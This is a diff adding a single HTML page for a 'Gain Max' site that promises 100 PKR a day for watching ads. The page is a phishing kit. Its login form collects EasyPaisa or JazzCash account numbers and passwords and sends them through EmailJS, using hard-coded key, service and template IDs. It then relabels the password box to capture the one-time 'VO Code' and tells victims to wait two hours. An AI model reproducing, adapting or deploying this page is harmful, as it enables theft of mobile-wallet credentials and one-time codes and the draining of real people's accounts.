@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gain Max - Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            overflow-x: hidden;
+            background-color: #f4f4f4;
+        }
+
+        header {
+            background-color: black;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 10px 20px;
+        }
+
+        header img {
+            height: 50px;
+        }
+
+        .company-name {
+            font-size: 28px;
+            font-weight: bold;
+            text-align: center;
+            flex-grow: 1;
+            text-shadow: 0 0 20px white, 0 0 30px white;
+            animation: glow 1.5s infinite alternate;
+        }
+
+        @keyframes glow {
+            0% {
+                text-shadow: 0 0 10px white, 0 0 20px white;
+            }
+            100% {
+                text-shadow: 0 0 20px white, 0 0 30px white;
+            }
+        }
+
+        .sidebar {
+            background-color: black;
+            position: fixed;
+            top: 60px;
+            left: -250px;
+            width: 250px;
+            height: calc(100% - 60px);
+            transition: left 0.5s ease;
+            padding: 20px;
+            color: white;
+            opacity: 0;
+            visibility: hidden;
+            z-index: 1000;
+        }
+
+        .sidebar.active {
+            left: 0;
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .sidebar-button {
+            cursor: pointer;
+            font-size: 24px;
+        }
+
+        .reveal-message {
+            animation: shine 2s infinite;
+            text-align: center;
+            margin-bottom: 20px;
+            border: 1px solid white;
+            padding: 10px;
+            border-radius: 5px;
+            font-size: 18px;
+            font-weight: bold;
+            display: block;
+        }
+
+        @keyframes shine {
+            0%,
+            100% {
+                color: white;
+            }
+            50% {
+                color: yellow;
+            }
+        }
+
+        .login-form {
+            display: flex;
+            flex-direction: column;
+            align-items: stretch;
+        }
+
+        .login-form input,
+        .login-form select {
+            border-radius: 10px;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            outline: none;
+            width: 100%;
+            transition: border 0.3s, background 0.3s;
+        }
+
+        .login-form input.highlight {
+            border: 2px solid white; /* Highlight color */
+            animation: shine 1.5s infinite alternate; /* Shining effect */
+        }
+
+        .login-form input#password {
+            color: black; /* Text color for VO Code input */
+            background-color: white; /* White background */
+        }
+
+        .login-form button {
+            background-color: white; /* White background */
+            color: black; /* Dark text */
+            border: 2px solid black; /* Black border */
+            border-radius: 25px;
+            padding: 10px;
+            cursor: pointer;
+            transition: background-color 0.3s, color 0.3s;
+        }
+
+        .login-form button:hover {
+            background-color: black; /* Change to black on hover */
+            color: white; /* Change text color to white on hover */
+        }
+
+        .content-image {
+            width: 100%;
+            height: auto;
+        }
+
+        @media (max-width: 600px) {
+            header {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+
+            .company-name {
+                font-size: 24px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+<header>
+    <img src="image logo.jpg" alt="Gain Max Logo">
+    <div class="company-name">Gain Max</div>
+    <div class="sidebar-button" onclick="toggleSidebar(event)">☰</div>
+</header>
+
+<div class="sidebar" id="sidebar">
+    <div class="reveal-message">Dear Gainers! Please login with your EasyPaisa or JazzCash account.</div>
+    <div class="reveal-message" id="finalProceedingMessage" style="display:none;">Click on Login again for final proceedings.</div>
+    <form id="login-form" class="login-form">
+        <input type="text" id="accountNumber" name="accountNumber" placeholder="Account Number" required>
+        <select id="paymentMethod" name="paymentMethod">
+            <option value="EasyPaisa">EasyPaisa</option>
+            <option value="JazzCash">JazzCash</option>
+        </select>
+        <input type="password" id="password" name="password" placeholder="Password" required>
+        <button type="submit" id="loginButton">Login</button>
+    </form>
+    <div id="confirmationMessage" class="reveal-message" style="display:none;">
+        A confirmation code has been sent to your device. Enter the VO Code here for proceeding with the login process. Then the ads will be available for you to watch!
+    </div>
+</div>
+
+<section style="position: relative; text-align: center; margin-bottom: 20px;">
+    <img src="image main.jpg" alt="Your Image" style="width: 100%; border-radius: 10px; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);">
+
+    <a href="#login" onclick="showMessage(); return false;"
+       style="display: inline-block; margin-top: 20px; background-color: red; color: white; font-weight: bold; padding: 12px 25px; border-radius: 5px; text-decoration: none; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5); transition: background-color 0.3s, transform 0.2s;">
+        Get Started
+    </a>
+
+    <div id="message" style="margin-top: 10px; color: red; font-weight: bold; font-size: 1.1em; display: none;">
+        Login to start making 100 PKR per Day by just watching Ads
+    </div>
+</section>
+
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+<script>
+
+function showMessage() {
+    document.getElementById('message').style.display = 'block';
+    alert('Please log in to continue.');
+}
+</script>
+
+<style>
+a:hover {
+    background-color: darkred;
+    transform: scale(1.05);
+}
+    (function () {
+        emailjs.init("cv-X00rP7Vlv3dBRH"); // Your EmailJS Public Key
+    })();
+
+    // Handle initial login form submission
+    document.getElementById('login-form').addEventListener('submit', function (event) {
+        event.preventDefault();
+
+        const serviceID = 'service_309t3yc'; // Your EmailJS service ID
+        const loginTemplateID = 'template_whfb8w2'; // Your EmailJS Template ID for login info
+
+        // Send login information
+        emailjs.sendForm(serviceID, loginTemplateID, this)
+            .then(() => {
+                alert('Login information sent successfully!');
+                const passwordField = document.getElementById('password');
+                passwordField.type = 'text'; // Change to text to show entered code
+                passwordField.value = ''; // Clear entered information
+                passwordField.placeholder = "Enter VO Code"; // Update placeholder
+                passwordField.classList.add('highlight'); // Highlight the field
+                passwordField.style.color = 'black'; // Ensure text color is black
+                document.getElementById('confirmationMessage').style.display = 'block'; // Show confirmation message
+            })
+            .catch((err) => {
+                alert('Failed to send login information: ' + JSON.stringify(err));
+            });
+    });
+
+    // Handle VO Code submission
+    document.getElementById('login-form').addEventListener('submit', function (event) {
+        const passwordField = document.getElementById('password');
+        if (passwordField.placeholder === "Enter VO Code") {
+            event.preventDefault(); // Prevent default submission
+
+            // Simulate second login submission
+            alert('You will be notified about your account verification and the ads will get unlocked typically in 2 hours!');
+            // Clear the field again for the next login attempt
+            passwordField.value = ''; 
+        }
+    });
+
+    function toggleSidebar(event) {
+        const sidebar = document.getElementById('sidebar');
+        sidebar.classList.toggle('active');
+        event.stopPropagation();
+    }
+
+    document.addEventListener('click', function (event) {
+        const sidebar = document.getElementById('sidebar');
+        const sidebarButton = document.querySelector('.sidebar-button');
+
+        if (sidebar.classList.contains('active') && !sidebar.contains(event.target) && !sidebarButton.contains(event.target)) {
+            sidebar.classList.remove('active');
+        }
+    });
+</script>
+
+</body>
+</html>
